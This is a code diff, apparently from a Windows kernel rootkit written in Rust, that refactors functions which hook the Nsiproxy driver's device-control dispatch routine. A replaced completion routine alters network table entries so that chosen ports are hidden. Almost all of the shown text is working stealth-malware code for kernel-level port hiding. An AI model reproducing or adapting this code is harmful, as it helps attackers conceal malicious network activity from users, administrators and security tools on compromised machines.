@@ -28,6 +28,12 @@ use common::{
 // The maximum number of ports that can be hidden
 const MAX_PORT: usize = 100;
 
+/// Control code for the NSI communication.
+const NIS_CONTROL_CODE: u32 = 1179675;
+
+/// Network driver name.
+const NSI_PROXY: &str = "\\Driver\\Nsiproxy";
+
 /// Holds the original NSI dispatch function.
 static mut ORIGINAL_NSI_DISPATCH: AtomicPtr<()> = AtomicPtr::new(null_mut());
 
@@ -38,164 +44,152 @@ pub static HOOK_INSTALLED: AtomicBool = AtomicBool::new(false);
 pub static PROTECTED_PORTS: Lazy<Mutex<Vec<TargetPort>>> =
     Lazy::new(|| Mutex::new(Vec::with_capacity(100)));
 
-/// Represents a Network structure used for hooking into the NSI proxy driver.
-pub struct Network;
+/// Installs a hook into the NSI proxy driver to intercept network table operations.
+///
+/// # Returns
+///
+/// If the hook is installed successfully.
+pub unsafe fn install_hook() -> ShadowResult<NTSTATUS> {
+    let mut driver_object: *mut DRIVER_OBJECT = null_mut();
+    let status = ObReferenceObjectByName(
+        &mut str_to_unicode(NSI_PROXY).to_unicode(),
+        OBJ_CASE_INSENSITIVE,
+        null_mut(),
+        0,
+        *IoDriverObjectType,
+        KernelMode as i8,
+        null_mut(),
+        &mut driver_object as *mut _ as *mut *mut c_void,
+    );
 
-impl Network {
-    /// Control code for the NSI communication.
-    const NIS_CONTROL_CODE: u32 = 1179675;
+    // Check if the driver object was referenced successfully.
+    if !NT_SUCCESS(status) {
+        return Err(ShadowError::ApiCallFailed(
+            "ObReferenceObjectByName",
+            status,
+        ));
+    }
 
-    /// Network driver name.
-    const NSI_PROXY: &str = "\\Driver\\Nsiproxy";
+    // Try to replace the original IRP_MJ_DEVICE_CONTROL dispatch function.
+    let major_function = &mut (*driver_object).MajorFunction[IRP_MJ_DEVICE_CONTROL as usize];
+    if let Some(original_function) = major_function.take() {
+        // Store the original dispatch function.
+        let original_function_ptr = original_function as *mut ();
+        ORIGINAL_NSI_DISPATCH.store(original_function_ptr, Ordering::SeqCst);
 
-    /// Installs a hook into the NSI proxy driver to intercept network table operations.
-    ///
-    /// # Returns
-    ///
-    /// If the hook is installed successfully.
-    pub unsafe fn install_hook() -> ShadowResult<NTSTATUS> {
-        let mut driver_object: *mut DRIVER_OBJECT = null_mut();
-        let status = ObReferenceObjectByName(
-            &mut str_to_unicode(Self::NSI_PROXY).to_unicode(),
-            OBJ_CASE_INSENSITIVE,
-            null_mut(),
-            0,
-            *IoDriverObjectType,
-            KernelMode as i8,
-            null_mut(),
-            &mut driver_object as *mut _ as *mut *mut c_void,
-        );
+        // Replace the dispatch function with the hook.
+        *major_function = Some(hook_nsi);
+        HOOK_INSTALLED.store(true, Ordering::SeqCst);
+    } else {
+        ObfDereferenceObject(driver_object.cast());
+        return Err(ShadowError::HookFailure);
+    }
 
-        // Check if the driver object was referenced successfully.
-        if !NT_SUCCESS(status) {
-            return Err(ShadowError::ApiCallFailed(
-                "ObReferenceObjectByName",
-                status,
-            ));
-        }
+    // Dereference the driver object after setting up the hook.
+    ObfDereferenceObject(driver_object.cast());
+    Ok(STATUS_SUCCESS)
+}
 
-        // Try to replace the original IRP_MJ_DEVICE_CONTROL dispatch function.
+/// Uninstalls the NSI hook, restoring the original dispatch function.
+///
+/// # Returns
+///
+/// If the hook was successfully uninstalled.
+pub unsafe fn uninstall_hook() -> ShadowResult<NTSTATUS> {
+    let mut driver_object: *mut DRIVER_OBJECT = null_mut();
+    let status = ObReferenceObjectByName(
+        &mut str_to_unicode(NSI_PROXY).to_unicode(),
+        OBJ_CASE_INSENSITIVE,
+        null_mut(),
+        0,
+        *IoDriverObjectType,
+        KernelMode as i8,
+        null_mut(),
+        &mut driver_object as *mut _ as *mut *mut c_void,
+    );
+
+    // Handle error if the driver object can't be referenced.
+    if !NT_SUCCESS(status) {
+        return Err(ShadowError::ApiCallFailed(
+            "ObReferenceObjectByName",
+            status,
+        ));
+    }
+
+    // If the hook is installed, restore the original dispatch function.
+    if HOOK_INSTALLED.load(Ordering::SeqCst) {
         let major_function = &mut (*driver_object).MajorFunction[IRP_MJ_DEVICE_CONTROL as usize];
-        if let Some(original_function) = major_function.take() {
-            // Store the original dispatch function.
-            let original_function_ptr = original_function as *mut ();
-            ORIGINAL_NSI_DISPATCH.store(original_function_ptr, Ordering::SeqCst);
 
-            // Replace the dispatch function with the hook.
-            *major_function = Some(Self::hook_nsi);
-            HOOK_INSTALLED.store(true, Ordering::SeqCst);
+        let original_function_ptr = ORIGINAL_NSI_DISPATCH.load(Ordering::SeqCst);
+        if !original_function_ptr.is_null() {
+            let original_function = core::mem::transmute(original_function_ptr);
+            *major_function = original_function;
+
+            HOOK_INSTALLED.store(false, Ordering::SeqCst);
         } else {
             ObfDereferenceObject(driver_object.cast());
             return Err(ShadowError::HookFailure);
         }
-
-        // Dereference the driver object after setting up the hook.
+    } else {
         ObfDereferenceObject(driver_object.cast());
-        Ok(STATUS_SUCCESS)
+        return Err(ShadowError::HookFailure);
     }
 
-    /// Uninstalls the NSI hook, restoring the original dispatch function.
-    ///
-    /// # Returns
-    ///
-    /// If the hook was successfully uninstalled.
-    pub unsafe fn uninstall_hook() -> ShadowResult<NTSTATUS> {
-        let mut driver_object: *mut DRIVER_OBJECT = null_mut();
-        let status = ObReferenceObjectByName(
-            &mut str_to_unicode(Self::NSI_PROXY).to_unicode(),
-            OBJ_CASE_INSENSITIVE,
-            null_mut(),
-            0,
-            *IoDriverObjectType,
-            KernelMode as i8,
-            null_mut(),
-            &mut driver_object as *mut _ as *mut *mut c_void,
+    // Dereference the driver object after removing the hook.
+    ObfDereferenceObject(driver_object.cast());
+    Ok(STATUS_SUCCESS)
+}
+
+/// Hooked dispatch function that intercepts NSI proxy requests and modifies network table entries.
+///
+/// This function intercepts network requests (IRPs) sent to the NSI proxy driver when the control
+/// code matches `NIS_CONTROL_CODE`. It replaces the completion routine with a custom handler
+/// to inspect and potentially modify network entries.
+///
+/// # Arguments
+///
+/// * `device_object` - Pointer to the device object associated with the request.
+/// * `irp` - Pointer to the IRP (I/O Request Packet) being processed.
+///
+/// # Returns
+///
+/// The result of the original dispatch function, or `STATUS_UNSUCCESSFUL` if the hook fails.
+unsafe extern "C" fn hook_nsi(device_object: *mut DEVICE_OBJECT, irp: *mut IRP) -> NTSTATUS {
+    let stack = (*irp)
+        .Tail
+        .Overlay
+        .__bindgen_anon_2
+        .__bindgen_anon_1
+        .CurrentStackLocation;
+
+    // If the control code matches, we replace the completion routine with a custom one.
+    let control_code = (*stack).Parameters.DeviceIoControl.IoControlCode;
+    if control_code == NIS_CONTROL_CODE {
+        let context = PoolMemory::new(
+            POOL_FLAG_NON_PAGED,
+            size_of::<(PIO_COMPLETION_ROUTINE, *mut c_void)>() as u64,
+            "giud",
         );
 
-        // Handle error if the driver object can't be referenced.
-        if !NT_SUCCESS(status) {
-            return Err(ShadowError::ApiCallFailed(
-                "ObReferenceObjectByName",
-                status,
-            ));
+        if let Some(addr) = context {
+            let address = addr.ptr as *mut (PIO_COMPLETION_ROUTINE, *mut c_void);
+            (*address).0 = (*stack).CompletionRoutine;
+            (*address).1 = (*stack).Context;
+
+            (*stack).Context = address as *mut c_void;
+            (*stack).CompletionRoutine = Some(irp_complete);
+            (*stack).Control |= SL_INVOKE_ON_SUCCESS as u8;
+
+            // Prevent memory deallocation.
+            core::mem::forget(addr);
         }
-
-        // If the hook is installed, restore the original dispatch function.
-        if HOOK_INSTALLED.load(Ordering::SeqCst) {
-            let major_function =
-                &mut (*driver_object).MajorFunction[IRP_MJ_DEVICE_CONTROL as usize];
-
-            let original_function_ptr = ORIGINAL_NSI_DISPATCH.load(Ordering::SeqCst);
-            if !original_function_ptr.is_null() {
-                let original_function = core::mem::transmute(original_function_ptr);
-                *major_function = original_function;
-
-                HOOK_INSTALLED.store(false, Ordering::SeqCst);
-            } else {
-                ObfDereferenceObject(driver_object.cast());
-                return Err(ShadowError::HookFailure);
-            }
-        } else {
-            ObfDereferenceObject(driver_object.cast());
-            return Err(ShadowError::HookFailure);
-        }
-
-        // Dereference the driver object after removing the hook.
-        ObfDereferenceObject(driver_object.cast());
-        Ok(STATUS_SUCCESS)
     }
 
-    /// Hooked dispatch function that intercepts NSI proxy requests and modifies network table entries.
-    ///
-    /// This function intercepts network requests (IRPs) sent to the NSI proxy driver when the control
-    /// code matches `NIS_CONTROL_CODE`. It replaces the completion routine with a custom handler
-    /// to inspect and potentially modify network entries.
-    ///
-    /// # Arguments
-    ///
-    /// * `device_object` - Pointer to the device object associated with the request.
-    /// * `irp` - Pointer to the IRP (I/O Request Packet) being processed.
-    ///
-    /// # Returns
-    ///
-    /// The result of the original dispatch function, or `STATUS_UNSUCCESSFUL` if the hook fails.
-    unsafe extern "C" fn hook_nsi(device_object: *mut DEVICE_OBJECT, irp: *mut IRP) -> NTSTATUS {
-        let stack = (*irp)
-            .Tail
-            .Overlay
-            .__bindgen_anon_2
-            .__bindgen_anon_1
-            .CurrentStackLocation;
+    // Call the original dispatch function.
+    let original_function_ptr = ORIGINAL_NSI_DISPATCH.load(Ordering::SeqCst);
+    let original_function: PDRIVER_DISPATCH = core::mem::transmute(original_function_ptr);
 
-        // If the control code matches, we replace the completion routine with a custom one.
-        let control_code = (*stack).Parameters.DeviceIoControl.IoControlCode;
-        if control_code == Self::NIS_CONTROL_CODE {
-            let context = PoolMemory::new(
-                POOL_FLAG_NON_PAGED,
-                size_of::<(PIO_COMPLETION_ROUTINE, *mut c_void)>() as u64,
-                "giud",
-            );
-
-            if let Some(addr) = context {
-                let address = addr.ptr as *mut (PIO_COMPLETION_ROUTINE, *mut c_void);
-                (*address).0 = (*stack).CompletionRoutine;
-                (*address).1 = (*stack).Context;
-
-                (*stack).Context = address as *mut c_void;
-                (*stack).CompletionRoutine = Some(irp_complete);
-                (*stack).Control |= SL_INVOKE_ON_SUCCESS as u8;
-
-                // Prevent memory deallocation.
-                core::mem::forget(addr);
-            }
-        }
-
-        // Call the original dispatch function.
-        let original_function_ptr = ORIGINAL_NSI_DISPATCH.load(Ordering::SeqCst);
-        let original_function: PDRIVER_DISPATCH = core::mem::transmute(original_function_ptr);
-
-        original_function.map_or(STATUS_UNSUCCESSFUL, |func| func(device_object, irp))
-    }
+    original_function.map_or(STATUS_UNSUCCESSFUL, |func| func(device_object, irp))
 }
 
 /// Completion routine that modifies network table entries after an NSI operation.
